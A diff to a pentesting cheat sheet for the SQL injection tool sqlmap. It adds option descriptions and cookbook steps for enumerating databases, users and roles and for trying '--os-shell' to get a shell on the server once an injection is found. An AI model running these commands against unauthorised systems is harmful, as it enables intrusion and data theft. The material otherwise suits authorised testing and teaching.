@@ -31,6 +31,9 @@ sqlmap
 	--dbms <dbms_name>		Use only sqli for a specifc dbms
 	--os-shell		Try to get a remote shell on the server
 	--is-dba		Check if we can get db admin priveledges
+	--flush-session	Deletes the records for the current session scan and starts from the beginning
+	--crawl <depth>	Crawl the website starting from the target URL
+	--os-shell		Tries creating a shell on the server
 
 
 ## Usage Examples
@@ -52,6 +55,16 @@ sqlmap -r <request_file_path> --batch -p <injection_field_name>
 
 ## Cookbook
 
+Start by doing a simple scan without the Time technique:
+
+	sqlmap -r <request> --technique "BEUSQ" --banner --dbs --current-user --current-db --users --roles
+	Don't use --batch on the first scan
+	Don't use --threads on the first scan
+
+Try creating a shell after finding an injection
+
+	sqlmap -r <request> --os-shell
+
 Start by doing a basic scan of the dbms, to get some basic info
 
 	sqlmap -r <> --batch --banner
@@ -67,3 +80,4 @@ Then pick a db and enum the tables
 ## More Information
 
 https://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap
+https://github.com/sqlmapproject/sqlmap/wiki/Usage
